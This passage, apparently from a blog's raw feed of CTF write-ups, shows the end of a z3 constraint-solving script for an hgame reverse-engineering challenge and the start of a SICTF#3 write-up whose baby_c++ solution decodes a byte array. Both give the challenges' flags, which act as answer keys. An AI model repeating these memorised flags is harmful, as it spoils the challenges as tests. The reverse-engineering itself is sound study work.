class="number">15</span> * (v18 + <span class="number">4</span> * v17) +  v7 +  <span class="number">35</span> * v1 +  <span class="number">29</span> * v15) +  <span class="number">4</span> * (<span class="number">57</span> * v6 + <span class="number">18</span> * (v5 + v37) + v28 + <span class="number">17</span> * v16 + <span class="number">55</span> * v30) +  <span class="number">151</span> * v40 +  <span class="number">230</span> * v4 +  <span class="number">197</span> * v19 == <span class="number">421974</span>)</span><br><span class="line">    ,  (<span class="number">209</span> * v21 +  <span class="number">249</span> * v30 +  <span class="number">195</span> * v2 +  <span class="number">219</span> * v25 +  <span class="number">201</span> * v39 +  <span class="number">85</span> * v18 +  <span class="number">213</span> * (v17 + v31) +  <span class="number">119</span> * (v11 + <span class="number">2</span> * v41) +  <span class="number">29</span> * (<span class="number">8</span> * v24 + v40 + <span class="number">4</span> * v27 + v27) +  <span class="number">2</span>* (v8 +  <span class="number">55</span> * (<span class="number">2</span> * v29 + v19) +  <span class="number">3</span> * (v10 + <span class="number">39</span> * v9 + <span class="number">2</span> * (v6 + <span class="number">20</span> * v20) + <span class="number">35</span> * v7) +  <span class="number">4</span> * (v5 + <span class="number">31</span> * v42 + <span class="number">28</span> * v3) +  <span class="number">26</span> * v28 +  <span class="number">46</span> * (v37 + v16) +  <span class="number">98</span> * v1) +  <span class="number">53</span> * v23 +  <span class="number">171</span> * v15 +  <span class="number">123</span> * v4 == <span class="number">442074</span>)</span><br><span class="line">    ,  ( <span class="number">162</span> * v19 +  <span class="number">74</span> * v5 +  <span class="number">28</span> * v27 +  <span class="number">243</span> * v42 +  <span class="number">123</span> * v28 +  <span class="number">73</span> * v8 +  <span class="number">166</span> * v23 +  <span class="number">94</span> * v24 +  <span class="number">113</span> * v11 +  <span class="number">193</span> * v22 +  <span class="number">122</span> * (v6 + <span class="number">2</span> * v7) +  <span class="number">211</span> * (v10 + v25) +  <span class="number">21</span> * (v17 + <span class="number">7</span> * v41) +  <span class="number">11</span> * (v4 + <span class="number">23</span> * (v16 + v39) + <span class="number">2</span> * (v40 + <span class="number">5</span> * v30 + <span class="number">2</span> * (<span class="number">2</span> * v18 + v29) + <span class="number">2</span> * v18 + v29)) +  <span class="number">5</span> * (<span class="number">46</span> * v9 + <span class="number">26</span> * v20 + <span class="number">4</span> * (v31 + <span class="number">2</span> * v21) + v15 + <span class="number">27</span> * v2 + <span class="number">10</span> * v1) +  <span class="number">36</span> * (v3 + <span class="number">5</span> * v26) == <span class="number">376007</span>)</span><br><span class="line">    ,  (<span class="number">63</span> * v19 +  <span class="number">143</span> * v5 +  <span class="number">250</span> * v6 +  <span class="number">136</span> * v2 +  <span class="number">214</span> * v40 +  <span class="number">62</span> * v26 +  <span class="number">221</span> * v42 +  <span class="number">226</span> * v7 +  <span class="number">171</span> * v28 +  <span class="number">178</span> * v8 +  <span class="number">244</span> * v23 +  ((v9 &lt;&lt; <span class="number">7</span>)) +  <span class="number">150</span> * v31 +  <span class="number">109</span> * v29 +  <span class="number">70</span> * v41 +  <span class="number">127</span> * v20 +  <span class="number">204</span> * v39 +  <span class="number">121</span> * v22 +  <span class="number">173</span> * v18 +  <span class="number">69</span> * (v25 + v30 + v27) +  <span class="number">74</span> * (v16 + <span class="number">2</span> * v15 + v15) +  <span class="number">22</span> * (<span class="number">7</span> * v24 + v17 + <span class="number">10</span> * v11) +  <span class="number">40</span> * (v1 + <span class="number">4</span> * v21 + v21) +  <span class="number">81</span> * v10 +  <span class="number">94</span> * v4 +  <span class="number">84</span> * v3 == <span class="number">411252</span>)</span><br><span class="line">    ,  (<span class="number">229</span> * v15 +  <span class="number">121</span> * v4 +  <span class="number">28</span> * v30 +  <span class="number">206</span> * v16 +  <span class="number">145</span> * v27 +  <span class="number">41</span> * v1 +  <span class="number">247</span> * v6 +  <span class="number">118</span> * v26 +  <span class="number">241</span> * v28 +  <span class="number">79</span> * v8 +  <span class="number">102</span> * v25 +  <span class="number">124</span> * v23 +  <span class="number">65</span> * v9 +  <span class="number">68</span> * v31 +  <span class="number">239</span> * v17 +  <span class="number">148</span> * v24 +  <span class="number">245</span> * v39 +  <span class="number">115</span> * v11 +  <span class="number">163</span> * v22 +  <span class="number">137</span> * v18 +  <span class="number">53</span> * (v5 + <span class="number">2</span> * v29) +  <span class="number">126</span> * (v40 + <span class="number">2</span> * v10) +  <span class="number">38</span> * (v7 + v21 + <span class="number">4</span> * v7 + <span class="number">6</span> * v41) +  <span class="number">12</span> * (v2 + <span class="number">16</span> * v42) +  <span class="number">109</span> * v20 +  <span class="number">232</span> * v3 +  <span class="number">47</span> * v19 == <span class="number">435012</span>)</span><br><span class="line">    ,  (<span class="number">209</span> * v21 +  <span class="number">233</span> * v40 +  <span class="number">93</span> * v1 +  <span class="number">241</span> * v2 +  <span class="number">137</span> * v8 +  <span class="number">249</span> * v17 +  <span class="number">188</span> * v29 +  <span class="number">86</span> * v24 +  <span class="number">246</span> * v10 +  <span class="number">149</span> * v20 +  <span class="number">99</span> * v11 +  <span class="number">37</span> * v22 +  <span class="number">219</span> * v18 +  <span class="number">17</span> * (v6 + <span class="number">10</span> * v25) +  <span class="number">49</span> * (v5 + <span class="number">3</span> * v3 + <span class="number">4</span> * v28 + v28) +  <span class="number">5</span> * (<span class="number">16</span> * v39 + <span class="number">11</span> * (v41 + <span class="number">2</span> * v27 + v27) + <span class="number">12</span> * v7 + v31 + <span class="number">30</span> * v16 + <span class="number">27</span> * v19) +  <span class="number">18</span> * (v23 + <span class="number">2</span> * (v4 + v26 + <span class="number">2</span> * v4) + v4 + v26 + <span class="number">2</span> * v4) +  <span class="number">24</span> * v9 +  <span class="number">109</span> * v42 +  <span class="number">183</span> * v30 +  <span class="number">154</span> * v15 == <span class="number">392484</span>)</span><br><span class="line">    ,  (<span class="number">155</span> * v15 +  <span class="number">247</span> * v40 +  <span class="number">157</span> * v28 +  <span class="number">119</span> * v23 +  <span class="number">161</span> * v17 +  <span class="number">133</span> * v20 +  <span class="number">85</span> * v22 +  <span class="number">229</span> * (v7 + v24) +  <span class="number">123</span> * (<span class="number">2</span> * v31 + v42) +  <span class="number">21</span> * (v41 + <span class="number">12</span> * v30) +  <span class="number">55</span> * (v9 + v5 + v18 + <span class="number">2</span> * v5) +  <span class="number">15</span> * (v3 + <span class="number">16</span> * v10 + <span class="number">9</span> * v21) +  <span class="number">2</span>* (v2 +  <span class="number">115</span> * v29 +  <span class="number">111</span> * v16 +  <span class="number">26</span> * v6 +  <span class="number">88</span> * v8 +  <span class="number">73</span> * v39 +  <span class="number">71</span> * v11 +  <span class="number">28</span> * (v26 + <span class="number">2</span> * (v25 + <span class="number">2</span> * v1)) +  <span class="number">51</span> * v27 +  <span class="number">99</span> * v4 +  <span class="number">125</span> * v19) == <span class="number">437910</span>)</span><br><span class="line">    ,  (<span class="number">220</span> * v3 +  <span class="number">200</span> * v4 +  <span class="number">139</span> * v15 +  <span class="number">33</span> * v5 +  <span class="number">212</span> * v30 +  <span class="number">191</span> * v16 +  <span class="number">30</span> * v27 +  <span class="number">233</span> * v1 +  <span class="number">246</span> * v6 +  <span class="number">89</span> * v2 +  <span class="number">252</span> * v40 +  <span class="number">223</span> * v42 +  <span class="number">19</span> * v25 +  <span class="number">141</span> * v21 +  <span class="number">163</span> * v9 +  <span class="number">185</span> * v17 +  <span class="number">136</span> * v31 +  <span class="number">46</span> * v24 +  <span class="number">109</span> * v10 +  <span class="number">217</span> * v39 +  <span class="number">75</span> * v22 +  <span class="number">157</span> * v18 +  <span class="number">125</span> * (v11 + v19) +  <span class="number">104</span> * (v33 + v20) +  <span class="number">43</span> * (v28 + <span class="number">2</span> * v29 + v29) +  <span class="number">32</span> * (v8 + v7 + <span class="number">2</span> * v8 + <span class="number">2</span> * (v23 + v26)) == <span class="number">421905</span>)</span><br><span class="line">    ,  (<span class="number">211</span> * v24 +  <span class="number">63</span> * v15 +  <span class="number">176</span> * v5 +  <span class="number">169</span> * v16 +  <span class="number">129</span> * v27 +  <span class="number">146</span> * v40 +  <span class="number">111</span> * v26 +  <span class="number">68</span> * v42 +  <span class="number">39</span> * v25 +  <span class="number">188</span> * v23 +  <span class="number">130</span> * v9 +  ((v31 &lt;&lt; <span class="number">6</span>)) +  <span class="number">91</span> * v41 +  <span class="number">208</span> * v20 +  <span class="number">145</span> * v39 +  <span class="number">247</span> * v18 +  <span class="number">93</span> * (v22 + v17) +  <span class="number">71</span> * (v6 + <span class="number">2</span> * v11) +  <span class="number">103</span> * (v8 + <span class="number">2</span> * v30) +  <span class="number">6</span> * (v21 + <span class="number">10</span> * v28 + <span class="number">28</span> * v7 + <span class="number">9</span> * v29 + <span class="number">19</span> * v2 + <span class="number">24</span> * v1 + <span class="number">22</span> * v3) +  <span class="number">81</span> * v10 +  <span class="number">70</span> * v4 +  <span class="number">23</span> * v19 == <span class="number">356282</span>)</span><br><span class="line">    ,  (<span class="number">94</span> * v42 +  <span class="number">101</span> * v2 +  <span class="number">152</span> * v40 +  <span class="number">200</span> * v7 +  <span class="number">226</span> * v8 +  <span class="number">211</span> * v23 +  <span class="number">121</span> * v24 +  <span class="number">74</span> * v11 +  <span class="number">166</span> * v18 +  (((v6 + <span class="number">3</span> * v28) &lt;&lt; <span class="number">6</span>)) +  <span class="number">41</span> * (<span class="number">4</span> * v9 + v21) +  <span class="number">23</span> * (v39 + <span class="number">11</span> * v41) +  <span class="number">7</span> * (v20 + <span class="number">10</span> * v25 + <span class="number">2</span> * v12 + v12) +  <span class="number">3</span> * (<span class="number">78</span> * v30 + <span class="number">81</span> * v16 + <span class="number">55</span> * v27 + <span class="number">73</span> * v1 + <span class="number">4</span> * v26 + v15 + <span class="number">85</span> * v3 + <span class="number">65</span> * v19) +  <span class="number">62</span> * v22 +  <span class="number">88</span> * v5 +  <span class="number">110</span> * v4 == <span class="number">423091</span>)</span><br><span class="line">    ,  (<span class="number">133</span> * v22 +  <span class="number">175</span> * v15 +  <span class="number">181</span> * v30 +  <span class="number">199</span> * v16 +  <span class="number">123</span> * v27 +  <span class="number">242</span> * v1 +  <span class="number">75</span> * v6 +  <span class="number">69</span> * v2 +  <span class="number">153</span> * v40 +  <span class="number">33</span> * v26 +  <span class="number">100</span> * v42 +  <span class="number">229</span> * v7 +  <span class="number">177</span> * v8 +  <span class="number">134</span> * v31 +  <span class="number">179</span> * v29 +  <span class="number">129</span> * v41 +  <span class="number">14</span> * v10 +  <span class="number">247</span> * v24 +  <span class="number">228</span> * v20 +  <span class="number">92</span> * v11 +  <span class="number">86</span> * (v9 + v32) +  <span class="number">94</span> * (v23 + v21) +  <span class="number">37</span> * (v17 + <span class="number">4</span> * v3) +  <span class="number">79</span> * (v25 + <span class="number">2</span> * v28) +  <span class="number">72</span> * v5 +  <span class="number">93</span> * v39 +  <span class="number">152</span> * v4 +  <span class="number">214</span> * v19 == <span class="number">391869</span>)</span><br><span class="line">    ,  (<span class="number">211</span> * v24 +  <span class="number">213</span> * v18 +  <span class="number">197</span> * v40 +  <span class="number">159</span> * v25 +  <span class="number">117</span> * v21 +  <span class="number">119</span> * v9 +  <span class="number">98</span> * v17 +  <span class="number">218</span> * v41 +  <span class="number">106</span> * v39 +  <span class="number">69</span> * v11 +  <span class="number">43</span> * (v2 + v29 + <span class="number">2</span> * v2) +  <span class="number">116</span> * (v4 + v10 + v37) +  <span class="number">5</span> * (v42 + <span class="number">9</span> * v23 + <span class="number">35</span> * v20 + <span class="number">37</span> * v31) +  <span class="number">11</span> * (v16 + <span class="number">13</span> * v27 + <span class="number">5</span> * v5 + <span class="number">8</span> * v30) +  <span class="number">6</span> * (<span class="number">29</span> * v28 + <span class="number">25</span> * v8 + <span class="number">38</span> * v22 + v15 + <span class="number">13</span> * v1 + <span class="number">10</span> * v3) +  <span class="number">136</span> * v7 +  <span class="number">142</span> * v6 +  <span class="number">141</span> * v19 == <span class="number">376566</span>)</span><br><span class="line">    ,  (<span class="number">173</span> * v3 +  <span class="number">109</span> * v15 +  <span class="number">61</span> * v30 +  <span class="number">187</span> * v1 +  <span class="number">79</span> * v6 +  <span class="number">53</span> * v40 +  <span class="number">184</span> * v21 +  <span class="number">43</span> * v23 +  <span class="number">41</span> * v9 +  <span class="number">166</span> * v31 +  <span class="number">193</span> * v41 +  <span class="number">58</span> * v24 +  <span class="number">146</span> * v10 +  ((v20 &lt;&lt; <span class="number">6</span>)) +  <span class="number">89</span> * v39 +  <span class="number">121</span> * v11 +  <span class="number">5</span> * (v17 + <span class="number">23</span> * v8) +  <span class="number">7</span> * (<span class="number">29</span> * v18 + v29 + <span class="number">4</span> * v7) +  <span class="number">13</span> * (<span class="number">3</span> * v42 + v16 + <span class="number">7</span> * v26 + <span class="number">13</span> * v2) +  <span class="number">3</span> * (v4 + <span class="number">83</span> * v5 + <span class="number">51</span> * v27 + <span class="number">33</span> * v22 + <span class="number">8</span> * (v19 + <span class="number">4</span> * v28) + <span class="number">18</span> * v25) == <span class="number">300934</span>)</span><br><span class="line">    ,  (<span class="number">78</span> * v1 +  <span class="number">131</span> * v5 +  <span class="number">185</span> * v16 +  <span class="number">250</span> * v40 +  <span class="number">90</span> * v26 +  <span class="number">129</span> * v42 +  <span class="number">255</span> * v28 +  <span class="number">206</span> * v8 +  <span class="number">239</span> * v25 +  <span class="number">150</span> * v10 +  <span class="number">253</span> * v39 +  <span class="number">104</span> * v22 +  <span class="number">58</span> * (v2 + <span class="number">2</span> * v7) +  <span class="number">96</span> * (v15 + v31) +  <span class="number">117</span> * (v9 + <span class="number">2</span> * v4) +  <span class="number">27</span> * (v17 + <span class="number">8</span> * v18 + v18) +  <span class="number">19</span> * (v23 + <span class="number">3</span> * v21 + <span class="number">4</span> * v29 + v29) +  <span class="number">7</span> * (<span class="number">22</span> * v41 + <span class="number">3</span> * (v11 + <span class="number">11</span> * v24) + v3 + <span class="number">29</span> * v6 + <span class="number">14</span> * v27) +  <span class="number">109</span> * v20 +  <span class="number">102</span> * v30 +  <span class="number">100</span> * v19 == <span class="number">401351</span>)</span><br><span class="line">    ,  (<span class="number">233</span> * v19 +  <span class="number">71</span> * v5 +  <span class="number">209</span> * v27 +  <span class="number">82</span> * v6 +  <span class="number">58</span> * v26 +  <span class="number">53</span> * v25 +  <span class="number">113</span> * v23 +  <span class="number">206</span> * v31 +  <span class="number">39</span> * v41 +  <span class="number">163</span> * v20 +  <span class="number">222</span> * v11 +  <span class="number">191</span> * v18 +  <span class="number">123</span> * (v7 + v40) +  <span class="number">69</span> * (v9 + <span class="number">2</span> * v22 + v22) +  <span class="number">9</span> * (v3 + <span class="number">8</span> * v24 + <span class="number">7</span> * (<span class="number">3</span> * v1 + v28) + <span class="number">5</span> * v16 + <span class="number">19</span> * v30) +  <span class="number">4</span> * (v15 + <span class="number">26</span> * v17 + <span class="number">61</span> * v29 + <span class="number">43</span> * v42 + <span class="number">49</span> * v2 + <span class="number">32</span> * v4) +  <span class="number">10</span> * (<span class="number">7</span> * (v8 + v36) + v39 + <span class="number">12</span> * v10) == <span class="number">368427</span>)</span><br><span class="line">    ,  (<span class="number">139</span> * v30 +  <span class="number">53</span> * v5 +  <span class="number">158</span> * v16 +  <span class="number">225</span> * v1 +  <span class="number">119</span> * v6 +  <span class="number">67</span> * v2 +  <span class="number">213</span> * v40 +  <span class="number">188</span> * v28 +  <span class="number">152</span> * v8 +  <span class="number">187</span> * v21 +  <span class="number">129</span> * v23 +  <span class="number">54</span> * v9 +  <span class="number">125</span> * v17 +  <span class="number">170</span> * v24 +  <span class="number">184</span> * v11 +  <span class="number">226</span> * v22 +  <span class="number">253</span> * v18 +  <span class="number">26</span> * (v29 + v41) +  <span class="number">97</span> * (v4 + <span class="number">2</span> * v25) +  <span class="number">39</span> * (<span class="number">5</span> * v26 + v27) +  <span class="number">21</span> * (v39 + <span class="number">8</span> * v42) +  <span class="number">12</span> * (<span class="number">17</span> * v10 + v31 + <span class="number">15</span> * v7 + <span class="number">12</span> * v19) +  <span class="number">165</span> * v20 +  <span class="number">88</span> * v15 +  <span class="number">157</span> * v3 == <span class="number">403881</span>)</span><br><span class="line">    ,  (<span class="number">114</span> * v3 +  <span class="number">61</span> * v27 +  <span class="number">134</span> * v40 +  <span class="number">62</span> * v42 +  <span class="number">89</span> * v9 +  <span class="number">211</span> * v17 +  <span class="number">163</span> * v41 +  <span class="number">66</span> * v24 +  <span class="number">201</span> * (v7 + v18) +  <span class="number">47</span> * (<span class="number">5</span> * v16 + v22) +  <span class="number">74</span> * (v4 + v31) +  <span class="number">142</span> * (v2 + v28) +  <span class="number">35</span> * (v20 + <span class="number">6</span> * v26) +  <span class="number">39</span> * (v15 + <span class="number">6</span> * v30) +  <span class="number">27</span> * (v25 + <span class="number">9</span> * v23 + <span class="number">8</span> * v6) +  <span class="number">4</span> * (v21 + <span class="number">63</span> * v19 + <span class="number">2</span> * (v1 + <span class="number">12</span> * (v10 + v5) + <span class="number">8</span> * v11 + <span class="number">26</span> * v29)) +  <span class="number">10</span> * (v8 + <span class="number">4</span> * v39 + v39) == <span class="number">382979</span>)</span><br><span class="line">    ,  (<span class="number">122</span> * v25 +  <span class="number">225</span> * v21 +  <span class="number">52</span> * v23 +  <span class="number">253</span> * v9 +  <span class="number">197</span> * v17 +  <span class="number">187</span> * v31 +  <span class="number">181</span> * v29 +  <span class="number">183</span> * v41 +  <span class="number">47</span> * v20 +  <span class="number">229</span> * v39 +  <span class="number">88</span> * v22 +  <span class="number">127</span> * (v10 + v32) +  <span class="number">37</span> * (v7 + <span class="number">3</span> * v3) +  (((v11 + <span class="number">2</span> * v30 + v30) &lt;&lt; <span class="number">6</span>)) +  <span class="number">7</span> * (<span class="number">21</span> * v8 + v27 + <span class="number">18</span> * (v4 + v1 + v38)) +  <span class="number">6</span> * (<span class="number">23</span> * v24 + v26 + <span class="number">17</span> * v2 + <span class="number">39</span> * v6) +  <span class="number">10</span> * (v5 + <span class="number">11</span> * v28 + <span class="number">21</span> * v42) +  <span class="number">149</span> * v19 +  <span class="number">165</span> * v40 +  <span class="number">121</span> * v15 == <span class="number">435695</span>)</span><br><span class="line">    ,  (<span class="number">165</span> * v20 +  <span class="number">223</span> * v4 +  <span class="number">249</span> * v5 +  <span class="number">199</span> * v1 +  <span class="number">135</span> * v2 +  <span class="number">133</span> * v26 +  <span class="number">254</span> * v42 +  <span class="number">111</span> * v7 +  <span class="number">189</span> * v28 +  <span class="number">221</span> * v25 +  <span class="number">115</span> * v21 +  <span class="number">186</span> * v9 +  <span class="number">79</span> * v41 +  <span class="number">217</span> * v24 +  <span class="number">122</span> * v11 +  <span class="number">38</span> * v18 +  <span class="number">109</span> * (v34 + v29) +  <span class="number">14</span> * (v8 + <span class="number">17</span> * v40 + <span class="number">8</span> * (v6 + v38)) +  <span class="number">4</span> * (<span class="number">11</span> * (<span class="number">5</span> * v30 + v39) + <span class="number">6</span> * (v10 + <span class="number">2</span> * v22) + v27 + <span class="number">52</span> * v17 + <span class="number">50</span> * v23) +  <span class="number">229</span> * v15 +  <span class="number">86</span> * v3 +  <span class="number">234</span> * v19 == <span class="number">453748</span>)</span><br><span class="line">    ,  (<span class="number">181</span> * v25 +  <span class="number">94</span> * v42 +  <span class="number">125</span> * v1 +  <span class="number">226</span> * v26 +  <span class="number">155</span> * v7 +  <span class="number">95</span> * v21 +  <span class="number">212</span> * v17 +  <span class="number">91</span> * v31 +  <span class="number">194</span> * v29 +  <span class="number">98</span> * v24 +  <span class="number">166</span> * v11 +  <span class="number">120</span> * v22 +  <span class="number">59</span> * v18 +  <span class="number">32</span> * (v9 + v8) +  <span class="number">158</span> * (v6 + v5) +  <span class="number">101</span> * (v41 + v19) +  <span class="number">63</span> * (v4 + <span class="number">2</span> * v23) +  <span class="number">67</span> * (v28 + <span class="number">2</span> * v20) +  <span class="number">11</span> * (v39 + <span class="number">10</span> * v16 + <span class="number">11</span> * v10) +  <span class="number">39</span> * (v30 + <span class="number">4</span> * (v2 + v15)) +  <span class="number">233</span> * v40 +  <span class="number">56</span> * v27 +  <span class="number">225</span> * v3 == <span class="number">358321</span>)</span><br><span class="line">    ,  (<span class="number">229</span> * v21 +  <span class="number">135</span> * v4 +  <span class="number">197</span> * v15 +  <span class="number">118</span> * v5 +  <span class="number">143</span> * v16 +  <span class="number">134</span> * v6 +  <span class="number">204</span> * v40 +  <span class="number">173</span> * v26 +  <span class="number">81</span> * v7 +  <span class="number">60</span> * v28 +  <span class="number">58</span> * v8 +  <span class="number">179</span> * v23 +  <span class="number">142</span> * v9 +  <span class="number">178</span> * v17 +  <span class="number">230</span> * v31 +  <span class="number">148</span> * v29 +  <span class="number">224</span> * v41 +  <span class="number">194</span> * v24 +  <span class="number">223</span> * v10 +  <span class="number">87</span> * v20 +  <span class="number">200</span> * v39 +  <span class="number">233</span> * v11 +  <span class="number">49</span> * v22 +  <span class="number">127</span> * v35 +  <span class="number">31</span> * (<span class="number">4</span> * v27 + v18) +  <span class="number">42</span> * (v1 + <span class="number">6</span> * v2) +  <span class="number">109</span> * v42 +  <span class="number">75</span> * v3 +  <span class="number">165</span> * v19 == <span class="number">456073</span>)</span><br><span class="line">    ,  (<span class="number">41</span> * v4 +  <span class="number">253</span> * v3 +  <span class="number">163</span> * v15 +  <span class="number">193</span> * v30 +  <span class="number">155</span> * v16 +  <span class="number">113</span> * v27 +  <span class="number">131</span> * v6 +  <span class="number">55</span> * v2 +  <span class="number">21</span> * v40 +  <span class="number">53</span> * v26 +  <span class="number">13</span> * v8 +  <span class="number">201</span> * v25 +  <span class="number">237</span> * v9 +  <span class="number">223</span> * v31 +  <span class="number">95</span> * v24 +  <span class="number">194</span> * v20 +  <span class="number">62</span> * v39 +  <span class="number">119</span> * v11 +  <span class="number">171</span> * v22 +  <span class="number">135</span> * v18 +  <span class="number">69</span> * (v10 + <span class="number">3</span> * v28) +  <span class="number">211</span> * (v1 + v29) +  <span class="number">4</span> * (<span class="number">43</span> * v7 + v42 + <span class="number">40</span> * v17) +  <span class="number">6</span> * (v5 + <span class="number">33</span> * v41 + <span class="number">20</span> * (<span class="number">2</span> * v19 + v21) + <span class="number">24</span> * v23) == <span class="number">407135</span>)</span><br><span class="line">    ,  (<span class="number">111</span> * v19 +  <span class="number">190</span> * v3 +  <span class="number">149</span> * v4 +  <span class="number">173</span> * v28 +  <span class="number">118</span> * v23 +  <span class="number">146</span> * v29 +  <span class="number">179</span> * v10 +  <span class="number">51</span> * v20 +  <span class="number">49</span> * v39 +  <span class="number">61</span> * v11 +  <span class="number">125</span> * v22 +  <span class="number">162</span> * v18 +  <span class="number">214</span> * v35 +  <span class="number">14</span> * (v34 + v24) +  <span class="number">178</span> * (v41 + v16) +  <span class="number">11</span> * (<span class="number">4</span> * v9 + v21 + <span class="number">17</span> * v42) +  <span class="number">65</span> * (v26 + v17 + <span class="number">2</span> * v26 + <span class="number">2</span> * v5) +  <span class="number">4</span> * (v7 + <span class="number">38</span> * v15 + <span class="number">4</span> * v13 + v13 + <span class="number">8</span> * v40 + <span class="number">43</span> * v2) == <span class="number">369835</span>)</span><br><span class="line">    ,  (<span class="number">27</span> * v27 +  <span class="number">223</span> * v6 +  <span class="number">147</span> * v26 +  <span class="number">13</span> * v21 +  <span class="number">35</span> * (v17 + <span class="number">7</span> * v4) +  <span class="number">57</span> * (v19 + v32 + <span class="number">3</span> * v11) +  <span class="number">11</span> * (v1 + <span class="number">17</span> * (v9 + v5) + <span class="number">10</span> * v16 + <span class="number">3</span> * v31) +  <span class="number">2</span>* (<span class="number">53</span> * v23 +  v25 +  <span class="number">38</span> * v15 +  <span class="number">43</span> * v42 +  <span class="number">115</span> * v29 +  <span class="number">61</span> * v22 +  <span class="number">111</span> * (v10 + v40) +  <span class="number">14</span> * (v20 + v7 + <span class="number">2</span> * v7 + <span class="number">8</span> * v28) +  <span class="number">109</span> * v2 +  <span class="number">100</span> * v41 +  <span class="number">63</span> * v8) +  <span class="number">93</span> * v39 +  <span class="number">251</span> * v30 +  <span class="number">131</span> * v3 == <span class="number">393303</span>)</span><br><span class="line">    ,  (<span class="number">116</span> * v9 +  <span class="number">152</span> * v29 +  <span class="number">235</span> * v20 +  <span class="number">202</span> * v18 +  <span class="number">85</span> * (v8 + <span class="number">3</span> * v11) +  <span class="number">221</span> * (v16 + v40) +  <span class="number">125</span> * (v33 + v24) +  <span class="number">7</span> * (<span class="number">19</span> * v4 + <span class="number">9</span> * (v10 + <span class="number">2</span> * v25) + v2 + <span class="number">33</span> * v3 + <span class="number">32</span> * v19) +  <span class="number">3</span> * (<span class="number">71</span> * v39 + <span class="number">43</span> * v22 + <span class="number">32</span> * (v17 + v26) + <span class="number">15</span> * (v5 + v6 + <span class="number">2</span> * v23) + v28 + <span class="number">74</span> * v31 + <span class="number">48</span> * v42) +  <span class="number">10</span> * (v21 + <span class="number">11</span> * v30 + <span class="number">16</span> * v15) +  <span class="number">136</span> * v7 +  <span class="number">106</span> * v1 +  <span class="number">41</span> * v27 == <span class="number">403661</span>)</span><br><span class="line">    ,  (<span class="number">127</span> * v4 +  <span class="number">106</span> * v15 +  <span class="number">182</span> * v30 +  <span class="number">142</span> * v5 +  <span class="number">159</span> * v16 +  <span class="number">17</span> * v1 +  <span class="number">211</span> * v6 +  <span class="number">134</span> * v2 +  <span class="number">199</span> * v7 +  <span class="number">103</span> * v28 +  <span class="number">247</span> * v23 +  <span class="number">122</span> * v9 +  <span class="number">95</span> * v41 +  <span class="number">62</span> * v10 +  <span class="number">203</span> * v39 +  <span class="number">16</span> * v11 +  <span class="number">41</span> * (<span class="number">6</span> * v42 + v25) +  <span class="number">9</span> * (<span class="number">22</span> * v24 + v20 + <span class="number">27</span> * v31 + <span class="number">28</span> * v40) +  <span class="number">10</span> * (v8 + v22 + v36 + <span class="number">8</span> * v17 + <span class="number">2</span> * (v22 + v36 + <span class="number">8</span> * v17) + <span class="number">13</span> * v29) +  <span class="number">6</span> * (<span class="number">23</span> * v27 + v26) +  <span class="number">213</span> * v18 +  <span class="number">179</span> * v3 +  <span class="number">43</span> * v19 == <span class="number">418596</span>)))</span><br><span class="line">s.add(<span class="number">149</span> * v19 +  v1 +  <span class="number">133</span> * v22 +  <span class="number">207</span> * v41 +  <span class="number">182</span> * v26 +  <span class="number">234</span> * v7 +  <span class="number">199</span> * v8 +  <span class="number">168</span> * v21 +  <span class="number">58</span> * v10 +  <span class="number">108</span> * v20 +  <span class="number">142</span> * v18 +  <span class="number">156</span> * (v9 + v25) +  <span class="number">16</span> * (v29 + <span class="number">6</span> * v31) +  <span class="number">126</span> * (v17 + <span class="number">2</span> * v39) +  <span class="number">127</span> * (v4 + <span class="number">2</span> * v27 + v40) +  <span class="number">49</span> * (v30 + <span class="number">4</span> * v16) +  <span class="number">11</span> * (v5 + <span class="number">22</span> * v11) +  <span class="number">5</span> * (v15 + v42 + <span class="number">45</span> * v24 + <span class="number">50</span> * v28) +  <span class="number">109</span> * v2 +  <span class="number">124</span> * v6 +  <span class="number">123</span> * v3 == <span class="number">418697</span>)</span><br><span class="line">pcheck(s,a1)</span><br><span class="line"><span class="comment">#hgame&#123;SMC_4nd_s0lv1ng_equ4t1Ons&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF#3 wp及复现</title>
      <link href="/posts/65f5db04.html"/>
      <url>/posts/65f5db04.html</url>
      
        <content type="html"><![CDATA[<p>又被暴打了QAQ</p><h2 id="RE">RE</h2><h3 id="baby-c">baby_c++</h3><p>判断的地方找数组即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">a = [<span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x49</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7B</span>, <span class="number">0x34</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x37</span>, <span class="number">0x34</span>, <span class="number">0x62</span>, <span class="number">0x38</span>, <span class="number">0x61</span>, <span class="number">0x2D</span>, <span class="number">0x39</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x36</span>, <span class="number">0x2D</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x62</span>, <span class="number">0x2D</span>, <span class="number">0x39</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x36</span>, <span class="number">0x2D</span>, <span class="number">0x64</span>, <span class="number">0x34</span>, <span class="number">0x66</span>, <span class="number">0x35</span>, <span class="number">0x65</span>, <span class="number">0x33</span>, <span class="number">0x37</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x66</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">pl(a)</span><br><span class="line"><span 